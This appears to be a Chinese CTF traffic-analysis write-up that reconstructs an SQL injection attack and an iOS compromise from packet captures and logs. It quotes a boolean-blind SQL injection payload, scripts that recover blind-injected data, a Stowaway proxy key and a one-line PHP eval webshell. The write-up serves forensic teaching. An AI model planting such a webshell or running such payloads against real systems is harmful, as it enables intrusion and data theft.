<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>黑客的socks5的连接账号、密码是什么</strong></p>
<p>前一题得到账号和密码<code>0HDFt16cLQJ#JTN276Gp</code></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Task1-3"><a href="#Task1-3" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客在注入过程中采用的注入手法叫什么</strong></p>
<p>查看日志的payload，很明显的布尔盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and if(substr(database(),1,1) = &#x27;.&#x27;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>



<h2 id="Task2-3"><a href="#Task2-3" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客在注入过程中，最终获取flag的数据库名、表名和字段名是什么</strong></p>
<p>依次查找即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">table_schema=&#x27;sqli&#x27;</span><br><span class="line">table_name=&#x27;flag&#x27;</span><br><span class="line">column=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>





<h2 id="Task3-3"><a href="#Task3-3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客最后获取到的flag字符串为什么</strong></p>
<p>把文件内容url解码一下，保存为md文件然后把出现的<code>€</code>去掉，因为UTF-8无法识别</p>
<p>然后GPT写个脚本，输出每次注入同一位置的最后一行的对应字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取文件内容</span><br><span class="line">with open(r&#x27;C:\Users\罗思远\Desktop\流量分析\NSSCTF\SQL注入\out.md&#x27;, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"># 创建字典存储数字和行索引</span><br><span class="line">index_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历每一行</span><br><span class="line">for index, line in enumerate(file_content):</span><br><span class="line">    # 提取数字部分</span><br><span class="line">    num = line.split(&#x27;,&#x27;)[1].strip()</span><br><span class="line"></span><br><span class="line">    # 将数字和行索引存储到字典中</span><br><span class="line">    if num in index_dict:</span><br><span class="line">        index_dict[num].append(index)</span><br><span class="line">    else:</span><br><span class="line">        index_dict[num] = [index]</span><br><span class="line"></span><br><span class="line"># 获取每个数字对应的最后一个行索引</span><br><span class="line">last_indexes = [indexes[-1] for indexes in index_dict.values()]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">for index in last_indexes:</span><br><span class="line">    line = file_content[index]</span><br><span class="line">    start_quote = line.find(&quot;&#x27;&quot;) + 1</span><br><span class="line">    end_quote = line.find(&quot;&#x27;&quot;, start_quote)</span><br><span class="line">    content = line[start_quote:end_quote]</span><br><span class="line">    results.append(content)</span><br><span class="line"></span><br><span class="line"># 拼接结果</span><br><span class="line">result = &#x27;&#x27;.join(results)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240419131922872.png"></p>
<h1 id="ios"><a href="#ios" class="headerlink" title="ios"></a>ios</h1><p><strong>背景</strong></p>
<blockquote>
<p>一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答</p>
</blockquote>
<h2 id="Task1-4"><a href="#Task1-4" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客所控制的C&amp;C服务器IP是什么</strong></p>
<p>查看下http流，在第一行也就是第十五个流找到控制ip</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000538452.png"></p>
<h2 id="Task2-4"><a href="#Task2-4" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客利用的Github开源项目的名字是什么</strong></p>
<p>直接筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;github&quot;</span><br></pre></td></tr></table></figure>

<p>github后面依次是用户和仓库，所以为<code>Stowaway</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000759739.png"></p>
<h2 id="Task3-4"><a href="#Task3-4" class="headerlink" title="Task3"></a>Task3</h2><p><strong>通讯加密密钥的明文是什么</strong></p>
<p>由前面知道开源项目地址，访问一下获得信息<code>-s</code>后的为加密密钥</p>
<p>所以明文为<code>hack4sec</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420001432616.png"></p>
<h2 id="Task4-1"><a href="#Task4-1" class="headerlink" title="Task4"></a>Task4</h2><p><strong>黑客通过SQL盲注拿到了一个敏感数据，内容是什么</strong></p>
<p>查找http流没有收获，结合题目给了私钥文件keylog.txt，那么有部分流量应该是加密过的</p>
<p><code>编辑 =&gt; 首选项</code>找到Protocols(协议)，点击TLS并导入keylog文件</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170300952.png"></p>
<p>成功得到http2流，然后搜索select</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170625538.png"></p>
<p>再筛选一下目的ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.12 &amp;&amp; http2</span><br></pre></td></tr></table></figure>

<p>接着导出文本</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170723870.png"></p>
<p>利用脚本将需要的sql盲注语句url解码并保存为out.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line">file_path = r&quot;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\test.txt&quot;  # 替换为你的文件路径</span><br><span class="line"></span><br><span class="line">with open(file_path, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line">target_sentence = &quot;GET /info?l=1&quot;  # 替换为你想要匹配的句子</span><br><span class="line"></span><br><span class="line">matching_parts = []</span><br><span class="line">for line in lines:</span><br><span class="line">    if target_sentence in line:</span><br><span class="line">        start_index = line.find(target_sentence)</span><br><span class="line">        end_index = line.find(&quot;end%29&quot;)</span><br><span class="line">        if end_index != -1:</span><br><span class="line">            part = line[start_index:end_index + len(&quot;end%29&quot;)].strip()</span><br><span class="line">            decoded_part = urllib.parse.unquote(part)</span><br><span class="line">            matching_parts.append(decoded_part)</span><br><span class="line"></span><br><span class="line"># 将匹配的部分保存到文件</span><br><span class="line">output_file = r&quot;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\out.txt&quot;  # 输出文件名</span><br><span class="line"></span><br><span class="line">with open(output_file, &quot;w&quot;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    for part in matching_parts:</span><br><span class="line">        file.write(part + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<p>然后继续使用脚本读取对应位置的最后一个盲注字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取文件内容</span><br><span class="line">with open(r&#x27;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\out.txt&#x27;, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"># 创建字典存储数字和行索引</span><br><span class="line">index_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历每一行</span><br><span class="line">for index, line in enumerate(file_content):</span><br><span class="line">    # 提取数字部分</span><br><span class="line">    num = line.split(&#x27;,&#x27;)[1].strip()</span><br><span class="line"></span><br><span class="line">    # 将数字和行索引存储到字典中</span><br><span class="line">    if num in index_dict:</span><br><span class="line">        index_dict[num].append(index)</span><br><span class="line">    else:</span><br><span class="line">        index_dict[num] = [index]</span><br><span class="line"></span><br><span class="line"># 获取每个数字对应的最后一个行索引</span><br><span class="line">last_indexes = [indexes[-1] for indexes in index_dict.values()]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">for index in last_indexes:</span><br><span class="line">    line = file_content[index]</span><br><span class="line">    start_quote = line.find(&quot;\&quot;&quot;) + 1</span><br><span class="line">    end_quote = line.find(&quot;\&quot;&quot;, start_quote)</span><br><span class="line">    content = line[start_quote:end_quote]</span><br><span class="line">    results.append(content)</span><br><span class="line"></span><br><span class="line"># 拼接结果</span><br><span class="line">result = &#x27;&#x27;.join(results)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>得到十六进制数据，直接cyberchef解码（因为是盲注，出现ZZZ说明前面已经结束了）</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421170940191.png" alt="image-20240421170940191"></p>
<h2 id="Task5-1"><a href="#Task5-1" class="headerlink" title="Task5"></a>Task5</h2><p><strong>黑客端口扫描的扫描器的扫描范围是什么</strong></p>
<p><code>分析 =&gt; 专家信息</code>找到<code>TCP: Connection reset (RST)</code>，端口扫描的特征是RST位</p>
<blockquote>
<p>在TCP连接的建立和关闭过程中，数据包中的TCP头部包含了一些标志位，用于指示连接的状态。其中，RST标志位用于重置（Reset）一个TCP连接。</p>
</blockquote>
<p>发现端口号是均匀增长，很明显的特征。端口是 10-499</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421172832871.png" alt="image-20240421172832871"></p>
<h2 id="Task6-1"><a href="#Task6-1" class="headerlink" title="Task6"></a>Task6</h2><p><strong>被害者手机上被拿走了的私钥文件内容是什么</strong></p>
<p>无答案</p>
<h2 id="Task7-1"><a href="#Task7-1" class="headerlink" title="Task7"></a>Task7</h2><p><strong>黑客访问&#x2F;攻击了内网的几个服务器，IP地址为什么</strong></p>
<p>注：多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)</p>
<p>我们前面已经导出sql盲注的txt文件，目标ip是<code>192.168.1.12</code>说明在被攻击</p>
<p>其次我们查看log日志文件，发现有对<code>172.28.0.2</code>进行攻击，大概过程为上传木马然后命令执行</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421173553044.png" alt="image-20240421173553044"></p>
<p>所以被攻击的IP有两个<code>172.28.0.2#192.168.1.12</code></p>
<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>黑客写入了一个webshell，其密码为什么</strong></p>
<p>注意看上一题是如何命令执行的，由于参数为fxxk所以大概木马语句如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#x27;fxxk&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>密码即为fxxk</p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>NSSCTF</tag>
      </tags>
  </entry>
</search>
